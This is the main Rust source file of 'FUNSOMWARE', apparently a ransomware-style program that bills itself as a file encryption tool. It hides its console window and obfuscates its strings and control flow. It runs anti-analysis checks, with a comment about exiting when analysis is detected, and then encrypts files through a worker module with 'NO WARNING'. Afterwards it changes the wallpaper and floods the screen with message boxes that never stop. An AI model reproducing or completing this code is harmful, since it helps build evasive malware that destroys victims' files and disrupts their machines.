// Hide console window on Windows when SHOW_CLI is false
// This must be at the very top of main.rs before any other code
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use cryptify::{encrypt_string, flow_stmt};
use std::thread;
use std::time::Duration;

mod config;
mod crypto;
mod worker;
mod wallpaper_manager;
mod messagebox_spawner;
mod antianalysis;

fn main() {
    // If SHOW_CLI is true but we're in windows subsystem mode, allocate a console
    #[cfg(target_os = "windows")]
    if config::SHOW_CLI {
        unsafe {
            use winapi::um::consoleapi::AllocConsole;
            AllocConsole();
        }
    }
    
    // Add obfuscated control flow
    flow_stmt!();

    if config::SHOW_CLI {
        print_banner();
    }

    // Run anti-analysis checks (currently just prints debug info)
    let _analysis_detected = antianalysis::detect_analysis_environment();
    // TODO: In production, exit or behave differently if analysis_detected is true
    
    // Run the file processing worker (NO WARNING - just do it!)
    match worker::run() {
        Ok(_) => {
            if config::SHOW_CLI {
                println!("\n{}", encrypt_string!("================================="));
                println!("{}", encrypt_string!("All operations completed successfully!"));
                println!("{}", encrypt_string!("================================="));
            }
            
            // STEP 1: Set wallpaper FIRST if enabled
            if config::SET_WALLPAPER {
                if let Err(e) = wallpaper_manager::set_wallpaper() {
                    if config::SHOW_CLI {
                        eprintln!("{} {}", encrypt_string!("Failed to set wallpaper:"), e);
                    }
                }
            }
            
            // STEP 2: Spawn message box hell (non-blocking, every N milliseconds)
            if config::SHOW_MESSAGEBOXES {
                if config::SHOW_CLI {
                    println!("\n{}", encrypt_string!("Starting message box hell... 😈"));
                    println!("{} {} {}", 
                        encrypt_string!("Spawning"),
                        config::MESSAGEBOX_LOOP_COUNT,
                        encrypt_string!("message boxes")
                    );
                }
                
                messagebox_spawner::spawn_messagebox_hell();
                
                if config::SHOW_CLI {
                    println!("{}", encrypt_string!("Message boxes spawning in background..."));
                    println!("{}", encrypt_string!("Main thread will stay alive indefinitely"));
                    println!("{}", encrypt_string!("Press Ctrl+C to exit (or just close all message boxes)"));
                }
                
                // Keep the main thread alive FOREVER so message box threads don't get killed
                // The message boxes will stay open until the user manually closes each one
                loop {
                    thread::sleep(Duration::from_secs(3600)); // Sleep in 1-hour chunks
                }
            }
        }
        Err(e) => {
            eprintln!("{} {}", encrypt_string!("Fatal error:"), e);
            
            // Show error message box (Windows only)
            #[cfg(target_os = "windows")]
            if config::SHOW_MESSAGEBOXES {
                show_error_messagebox(&format!("{}: {}", encrypt_string!("Fatal error"), e));
            }
            
            std::process::exit(1);
        }
    }

    // Add more obfuscated control flow
    flow_stmt!();
}

fn print_banner() {
    flow_stmt!();
    
    println!("{}", encrypt_string!("================================="));
    println!("{}", encrypt_string!("   FUNSOMWARE v0.1.0"));
    println!("{}", encrypt_string!("   File Encryption Tool"));
    println!("{}", encrypt_string!("================================="));
    println!();
}

#[cfg(target_os = "windows")]
fn show_error_messagebox(message: &str) {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONERROR};
    
    let title = "FUNSOMWARE - Error";
    
    unsafe {
        // Use &title[..] to handle both &str and String from obfuscator
        let title_wide: Vec<u16> = OsStr::new(&title[..])
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        let text_wide: Vec<u16> = OsStr::new(message)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        MessageBoxW(
            std::ptr::null_mut(),
            text_wide.as_ptr(),
            title_wide.as_ptr(),
            MB_OK | MB_ICONERROR,
        );
    }
}
